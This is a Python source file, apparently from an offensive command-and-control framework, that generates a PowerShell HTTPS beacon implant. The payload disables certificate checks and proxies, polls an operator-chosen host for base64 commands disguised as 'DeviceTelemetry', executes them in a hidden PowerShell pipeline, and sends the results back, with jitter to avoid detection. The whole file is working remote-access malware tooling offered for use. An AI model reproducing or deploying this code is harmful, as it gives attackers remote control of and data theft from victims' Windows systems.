import base64
from core.payload_generator.common import payload_utils as payutils
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"


def make_raw(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter):
    beacon_url = f"https://{ip}:{port}/"
    interval = beacon_interval

    formatted_headers = payutils.build_powershell_headers(headers) if headers else ""

    if accept:
        accept_header = f"$req.Accept = '{accept}';"

    else:
        accept_header = ""

    if byte_range:
        byte_range = f"$req.AddRange(0, {byte_range});"

    else:
        byte_range = ""

    raw = (
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = "
        "{ $true };"
        f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
        f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
        f"$sid=G-SID;$uri='{beacon_url}';"
        "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
        "$hdr=@{'X-Session-ID'=$sid};"
        f"$jitter={jitter};"
        f"$jitmax = $jitter + 30;"

        # Define Get-Task
        "Function Get-Task {"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'GET';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        f"{formatted_headers}"
        f"$req.UserAgent = '{useragent}';"
        f"{accept_header}"
        f"{byte_range}"
        "$resp = $req.GetResponse();"
        "$stream = $resp.GetResponseStream();"
        "$reader = New-Object System.IO.StreamReader($stream);"
        "$result = $reader.ReadToEnd();"
        "$reader.Close();$stream.Close();$resp.Close();"
        "return $result"
        "};"

        # Define Send-Output
        "Function Send-Output($payload) {"
        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'POST';"
        "$req.ContentType = 'application/json';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        f"{formatted_headers}"
        f"$req.UserAgent = '{useragent}';"
        f"{accept_header}"
        f"{byte_range}"
        "$req.ContentLength = $bytes.Length;"
        "$stream = $req.GetRequestStream();"
        "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
        "$resp = $req.GetResponse();$resp.Close()"
        "};"

        # Init PS pipeline
        "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
        "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
        "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

        # Beacon loop
        "while($true){"
        "try{"
        "$taskJson = Get-Task;"
        "$task = ConvertFrom-Json $taskJson;"
        "if($task.DeviceTelemetry){"
        "$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
        "$pipeline.Commands.Clear();"
        "$pipeline.AddScript($cmd)|Out-Null;"
        "$results = $pipeline.Invoke();"
        "$output = $results|Out-String;"
        "$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
        "$body = @{output=$b64}|ConvertTo-Json;"
        "Send-Output $body;"
        "}"
        "}catch{};"
        f"if ($jitter -eq 0) {{ $delay = {interval} }} else {{ "
        f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
        f"$j = [Math]::Floor(({interval} * $percent) / 100);"
        f"$delay = {interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
        "Start-Sleep -Seconds $delay;"
        "}"
    )

    return raw


def generate_windows_powershell_https(ip, port, obs, beacon_interval, headers, useragent, accept, byte_range, jitter=0, no_child=None, profile=None):
    if obs is None or obs == 0:
    	payload = make_raw(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter)
    	cmd = payutils.encode_win_payload(payload, no_child)
    	payutils.copy_and_print(cmd)
    	return cmd

    elif obs == 1:
        payload = generate_windows_powershell_https_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter)
        cmd = payutils.encode_win_payload(payload, no_child)
        payutils.copy_and_print(cmd)
        return cmd

    else:
        print(brightred + f"[*] Obfuscation for HTTPS payloads not yet available")

def generate_windows_powershell_https_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter):
    """
    Obfuscation level 1: execute commands via cmd.exe /c and capture stdout+stderr
    """
    beacon_url = f"https://{ip}:{port}/"
    interval = beacon_interval

    formatted_headers = payutils.build_powershell_headers(headers) if headers else ""

    if accept:
        accept_header = f"$req.Accept = '{accept}';"

    else:
        accept_header = ""

    if byte_range:
        byte_range = f"$req.AddRange(0, {byte_range});"

    else:
        byte_range = ""

    raw = (
        "[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true };"
        f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
        f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
        f"$sid=G-SID;$uri='{beacon_url}';"
        "[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
        "$hdr=@{'X-Session-ID'=$sid};"

        # Define Get-Task
        "Function Get-Task {"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'GET';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        f"{formatted_headers}"
        f"$req.UserAgent = '{useragent}';"
        f"{accept_header}"
        f"{byte_range}"
        "$resp = $req.GetResponse();"
        "$stream = $resp.GetResponseStream();"
        "$reader = New-Object System.IO.StreamReader($stream);"
        "$result = $reader.ReadToEnd();"
        "$reader.Close();$stream.Close();$resp.Close();"
        "return $result"
        "};"

        # Define Send-Output
        "Function Send-Output($payload) {"
        "$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
        "$req = [System.Net.HttpWebRequest]::Create($uri);"
        "$req.Method = 'POST';"
        "$req.ContentType = 'application/json';"
        "$req.Headers.Add('X-Session-ID',$sid);"
        f"{formatted_headers}"
        f"$req.UserAgent = '{useragent}';"
        f"{accept_header}"
        f"{byte_range}"
        "$req.ContentLength = $bytes.Length;"
        "$stream = $req.GetRequestStream();"
        "$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
        "$resp = $req.GetResponse();$resp.Close()"
        "};"

        # Init PS pipeline
        "$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
        "$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
        "$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

        # Beacon loop using pipeline-based execution
        "while($true){"
        "  try{"
        "    $taskJson = Get-Task;"
        "    $task = ConvertFrom-Json $taskJson;"
        "    if($task.DeviceTelemetry){"
        "      $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($task.DeviceTelemetry.Telemetry));"
        "      $pipeline.Commands.Clear();"
        "      $pipeline.AddScript($cmd)|Out-Null;"
        "      $results = $pipeline.Invoke();"
        "      $output = $results|Out-String;"
        "      $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
        "      $body = @{ output = $b64 } | ConvertTo-Json;"
        "      Send-Output $body;"
        "    }"
        "  } catch{};"
        f"$jitter = {jitter};"
        f"$jitmax = $jitter + 30;"
        f"if ($jitter -eq 0) {{ $delay = {interval} }} else {{ "
        f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
        f"$j = [Math]::Floor(({interval} * $percent) / 100);"
        f"$delay = {interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
        "Start-Sleep -Seconds $delay;"
        "}"
    )

    return raw
